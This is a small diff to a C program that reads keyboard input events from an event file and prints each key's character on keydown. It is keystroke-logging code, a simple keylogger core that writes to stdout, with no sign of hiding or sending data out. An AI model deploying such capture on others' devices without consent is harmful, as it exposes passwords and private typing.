@@ -106,9 +106,12 @@ int main(int argc, char *argv[])
     }
     log_info("File opened\n");
 
+    /* keep reading the event file for changes */
     while (1) {
         read(event_fd, &buffer, sizeof(struct input_event));
-        if (buffer.type == EV_KEY) {
+
+        /* log key on keydown */
+        if (buffer.type == EV_KEY && buffer.value == 1) {
             fflush(stdout);
             printf("%c", key_table[buffer.code]);
         }
